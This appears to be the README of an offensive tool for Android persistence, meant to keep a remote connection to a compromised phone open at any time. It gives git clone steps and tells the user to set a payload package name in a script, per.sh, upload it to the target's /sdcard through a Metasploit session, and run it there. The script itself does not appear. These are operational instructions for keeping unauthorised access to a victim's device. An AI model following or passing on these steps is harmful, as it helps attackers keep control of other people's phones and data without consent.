# Android bash Persistance

A bash persistance for get connection from the target in any time 

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)


## Installation

Instructions for how to install and set up the project.

```bash
# Clone the repository
git clone https://github.com/bad-boy2py/Andoird_Persistance.git

# Navigate to the project directory
cd Andoird_Persistance
```
## Usage
1. change 'PayloadPackgeName' with your payload package name in per.sh file
2. make per.sh excutable by :
`sudo chmod +x per.sh`
3. upload per.sh after make it excutable to target storage, for exmple in metasploit:
`upload per.sh /sdcard`
4. after upload file run it by : `sh per.sh`
